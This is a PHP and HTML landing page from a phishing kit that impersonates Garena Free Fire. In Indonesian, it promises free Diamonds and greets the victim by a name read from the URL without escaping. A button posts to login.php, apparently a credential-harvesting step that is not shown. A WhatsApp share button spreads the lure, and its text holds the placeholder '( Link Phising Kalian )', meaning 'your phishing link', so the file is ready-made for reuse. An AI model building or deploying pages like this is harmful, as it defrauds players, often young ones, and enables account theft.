<?php
if(!empty($_GET['s'])){
if($_GET['s']){
$mx = str_replace("%20",".",$_GET['s']);
$mx = ucwords(strtolower($mx));
$nama=''.$mx.'';
}else{
$nama='nama'; }}
$a_array = array(
'img2/1.png',
'img2/2.png',
'img2/3.png',
'img2/4.png',
'img2/5.png');
$a = $a_array[rand(0, (count($a_array)-1))];
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>
      Garena Free Fire. Best survival Battle Royale on mobile!
    </title>     
    <meta name="description" content="Hello <?php echo ''.$nama.''; ?> - Ambil Sekarang Hadiahmu"/>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
    <meta name="viewport" content="width=360.1, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes"/>
    <meta name="apple-mobile-web-app-capable" content="yes"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
    <meta name="msapplication-tap-highlight" content="no"/>
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
    <meta property="og:title" content="Selamat <?php echo ''.$nama.''; ?>, Kamu mendapatkan Diamonds Silahkan Klik & Ambil - Garena Free Fire" />
    <meta property="og:image" content="<?php echo ''.$a.''; ?>" />
    <link href='img-zone/icon.png' rel='icon' type='image/x-png'/>
     <link rel="stylesheet" href="css-zone/zone-style.css">
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

    <script language="JavaScript">document.write(zonehost())</script>
  </head>
  <body>

<div class="form">
                 
      <font color="white">Selamat Buat 
      <br>
      
          <script>
            var text="<?php echo ''.$nama.''; ?>"
            var speed=50
            if (document.all||document.getElementById){
              document.write('<span id="highlight">' + text + '</span>')
              var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
              }
            else
              document.write(text)
              var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
              var r=1
              var g=1
              var b=1
              var seq=1
              function changetext(){
                rainbow="#"+hex[r]+hex[g]+hex[b]
                storetext.style.color=rainbow
              }
            function change(){
              if (seq==6){
                b--
                if (b==0)
                  seq=1
                  }
              if (seq==5){
                r++
                if (r==12)
                  seq=6
                  }
              if (seq==4){
                g--
                if (g==0)
                  seq=5
                  }
              if (seq==3){
                b++
                if (b==12)
                  seq=4
                  }
              if (seq==2){
                r--
                if (r==0)
                  seq=3
                  }
              if (seq==1){
                g++
                if (g==12)
                  seq=2
                  }
              changetext()
            }
            function starteffect(){
              if (document.all||document.getElementById)
                flash=setInterval("change()",speed)
                }
            starteffect()
          </script>
        </b>
        <br/>Silahkan Ambil Hadiahmu
      </font>
    </div>
    <div class="form">
    <br/>
    <div class="gift">
      <form action="login.php" method="POST">
        <img class="img-skin" src="<?php echo ''.$a.''; ?>" alt="Reload..."/>
        <br/>
        <input type="hidden" name="nama" value="">
        <button type="submit" class="btn-gift">AMBIL
        </button>
      </div><br><br>

        <h3>Bagikan Ke Teman Kamu Via Whatsapp</h3>
       <a href="whatsapp://send?text=*Dapatkan 6000 Diamonds Free Fire Gratis Hanya Di ( Link Phising Kalian )" data-action="share/whatsapp/share" onclick="incrementValue()" target="_blank">
<button class="btn btn-primary" onclick="fn1()" type="button">WhatsApp</button></a>
      </form>
</html>
    </div>
  </body>
</html>